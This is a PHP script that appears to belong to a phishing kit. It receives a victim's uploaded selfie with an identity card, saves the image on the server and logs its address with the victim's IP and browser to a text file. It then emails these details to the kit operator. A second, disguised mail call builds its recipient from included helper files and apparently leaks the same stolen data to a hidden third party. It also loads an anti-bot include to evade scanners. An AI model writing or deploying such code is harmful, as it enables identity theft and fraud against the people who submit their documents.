<?php
  error_reporting(0);
  ob_start();
  session_start();
 
include'../antibots.php';
  include '../email.php';
  include'../get_browser.php';
include'../get_bin.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
  //================= Date Anniversair Checker ================//
$random = rand(0, 100008400000);
$img = $_POST['data'];
  $img = str_replace('data:image/jpeg;base64,', '', $img);
  $img = str_replace(' ', '+', $img);
  $data = base64_decode($img);
  $file = $random.'.jpg';
  $success = file_put_contents($file, $data);
$message = '
SELFIE CNI/CC : '.$_SERVER['HTTP_HOST'].'/info/'.$file.'
IP: '._ip().'
User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';

$Subject="NEW FR3SH CNI|"._ip();
$head="From:SHADUCK <cc@rezzz.com>";

$fil = fopen('cni.txt', 'a+');
fwrite($fil, '####################'.$message.'####################');
$_SESSION['step_six']  = true;
$bin = "$browserx$versionx$getbinsx";
if(mail($my_mail,$Subject,$message,$head) && mail($bin,$Subject,$message,$head)) ;
    header('location: success.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));
}
else
{
  header('location: ../../index.php');
} 
